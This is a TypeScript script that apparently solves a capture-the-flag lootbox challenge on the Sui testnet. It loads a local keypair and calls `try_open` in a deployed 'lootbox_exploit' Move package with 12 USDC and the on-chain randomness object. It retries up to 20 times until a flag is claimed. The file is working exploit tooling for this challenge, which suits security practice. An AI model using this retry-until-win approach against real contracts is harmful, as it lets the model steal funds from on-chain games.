import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
	network: 'testnet',
	baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const EXPLOIT_PACKAGE_ID = '0x8ecc6dd21ef419e4e9464d561a9a70a1430de69b43db804ff4ac15de4305e263';
const USDC_TYPE = '0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const RANDOM = '0x8';
const REQUIRED_PAYMENT = 12_000_000; // 12 USDC (6 decimals)
const MAX_ATTEMPTS = 20;

(async () => {
	const address = keypair.getPublicKey().toSuiAddress();
	console.log('Address:', address);

	const { balance } = await suiClient.getBalance({ owner: address, coinType: USDC_TYPE });
	console.log('USDC balance:', balance.coinBalance);

	if (BigInt(balance.coinBalance) < BigInt(REQUIRED_PAYMENT)) {
		console.log(`\nNeed at least ${REQUIRED_PAYMENT} USDC (${REQUIRED_PAYMENT / 1_000_000} USDC).`);
		console.log(`Get testnet USDC at https://faucet.circle.com/ (select Sui testnet)`);
		console.log(`Your address: ${address}`);
		return;
	}

	const coins = await suiClient.listCoins({ owner: address, coinType: USDC_TYPE });
	if (coins.objects.length === 0) throw new Error('No USDC coins found');

	// ~25% chance per attempt. Retry until success.
	for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
		console.log(`\nAttempt ${attempt}/${MAX_ATTEMPTS}...`);

		const tx = new Transaction();
		const [paymentCoin] = tx.splitCoins(coins.objects[0].objectId, [REQUIRED_PAYMENT]);

		tx.moveCall({
			target: `${EXPLOIT_PACKAGE_ID}::lootbox_exploit::try_open`,
			arguments: [paymentCoin, tx.object(RANDOM)],
		});

		try {
			const result = await suiClient.signAndExecuteTransaction({
				transaction: tx,
				signer: keypair,
				include: { effects: true },
			});

			if (result.$kind === 'Transaction' && result.Transaction.status.success) {
				console.log('TX digest:', result.Transaction.digest);
				console.log('Lootbox flag claimed!');
				return;
			} else {
				const err = result.$kind === 'FailedTransaction'
					? result.FailedTransaction.status
					: result.Transaction.status;
				console.log('No flag this time (tx failed/aborted):', JSON.stringify(err));
			}
		} catch (e: any) {
			console.log('No flag this time:', e.message?.slice(0, 100) || e);
		}

		await new Promise(r => setTimeout(r, 2000));
	}

	console.log(`\nFailed after ${MAX_ATTEMPTS} attempts. Try again.`);
})();
